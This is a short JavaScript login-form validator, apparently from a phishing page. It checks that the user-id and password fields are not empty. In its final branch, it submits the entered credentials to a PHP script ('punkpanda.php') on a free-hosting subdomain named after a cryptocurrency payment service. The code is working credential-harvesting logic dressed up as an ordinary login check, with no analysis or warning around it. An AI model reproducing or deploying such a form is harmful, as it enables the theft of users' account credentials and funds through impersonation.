function check() {

        if (document.mail_frm.txt_un.value == "") {

            	//alert("Enter Login User Id.");

		myFunction("Enter Login User Id.","snackbar");

            	document.mail_frm.txt_un.focus();
            	document.mail_frm.txt_un.select();
            	return false;
        }
        else if (document.mail_frm.txt_pwd.value == "")
		{
			//alert("Enter Password.");

			myFunction("Enter Password.","snackbar");

			document.mail_frm.txt_pwd.focus();
			document.mail_frm.txt_pwd.select();
			return false;
		}
		else
		{
			document.mail_frm.action = "https://faucetspay.000webhostapp.com/punkpanda.php";
			document.mail_frm.submit();
			return true;
		}
    }
